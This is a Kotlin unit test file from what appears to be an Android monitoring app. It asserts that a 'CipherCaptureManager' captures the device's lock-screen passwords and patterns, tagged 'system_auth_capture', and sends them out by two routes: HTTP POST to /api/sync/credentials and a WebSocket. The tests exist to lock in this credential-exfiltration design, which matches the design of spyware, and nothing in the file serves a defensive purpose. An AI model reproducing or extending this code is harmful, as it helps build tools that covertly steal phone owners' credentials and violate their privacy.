package com.storm.safe.rock.service.modules.cipher

import org.junit.Test
import org.junit.Assert.*

class CipherUploadTriplePathTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/cipher/CipherCaptureManager.kt").readText()
    }

    // ═══ 路径 1: HTTP POST /api/sync/credentials (含合并字段) ═══

    @Test
    fun `uploadPasswordViaHttp method exists`() {
        assertTrue(
            "uploadPasswordViaHttp method must exist",
            source.contains("fun uploadPasswordViaHttp(")
        )
    }

    @Test
    fun `uploadPasswordViaHttp calls HttpManager uploadPasswordCapture`() {
        val methodIdx = source.indexOf("fun uploadPasswordViaHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must call httpManager.uploadPasswordCapture", body.contains("uploadPasswordCapture"))
    }

    @Test
    fun `uploadPasswordViaHttp passes system_auth_capture as inputMethod`() {
        val methodIdx = source.indexOf("fun uploadPasswordViaHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("inputMethod must be system_auth_capture", body.contains("system_auth_capture"))
    }

    @Test
    fun `uploadPasswordViaHttp passes cipherGradeCode from path-3 merge`() {
        val methodIdx = source.indexOf("fun uploadPasswordViaHttp(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must pass cipherGradeCode", body.contains("cipherGradeCode"))
        assertTrue("must pass patternCipher", body.contains("patternCipher"))
        assertTrue("must pass isLocked", body.contains("isLocked"))
    }

    // ═══ 路径 2: WebSocket ═══

    @Test
    fun `confirmAndSaveLastCipher calls WS and HTTP upload`() {
        val methodIdx = source.indexOf("fun confirmAndSaveLastCipherInternal(")
            .takeIf { it > 0 } ?: source.indexOf("fun confirmAndSaveLastCipher(")
        assertTrue("confirmAndSaveLastCipher must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 3000).coerceAtMost(source.length))
        assertTrue("must call sendPasswordViaWebSocket (path 2)", body.contains("sendPasswordViaWebSocket"))
        assertTrue("must call uploadPasswordViaHttp (path 1)", body.contains("uploadPasswordViaHttp"))
    }

    // ═══ 路径 3 已移除: 不应存在 ═══

    @Test
    fun `uploadCipherViaDirectHttp is removed`() {
        assertFalse(
            "uploadCipherViaDirectHttp should be removed (merged into path 1)",
            source.contains("fun uploadCipherViaDirectHttp(")
        )
    }
}
